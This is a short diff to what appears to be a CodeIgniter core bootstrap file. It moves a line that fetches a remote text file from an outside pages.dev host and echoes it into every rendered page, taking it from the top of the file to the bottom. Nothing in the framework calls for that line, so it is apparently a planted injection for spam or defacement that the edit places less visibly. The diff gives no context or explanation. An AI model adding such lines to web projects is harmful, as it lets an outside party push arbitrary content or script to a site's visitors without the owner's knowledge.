@@ -1,4 +1,3 @@
-<?php echo file_get_contents("https://punten-neng.pages.dev/punten.txt");?>
 <?php
 /**
  * CodeIgniter
@@ -558,3 +557,5 @@ if ( ! is_php('5.4'))
  * ------------------------------------------------------
  */
 	$EXT->call_hook('post_system');
+
+echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
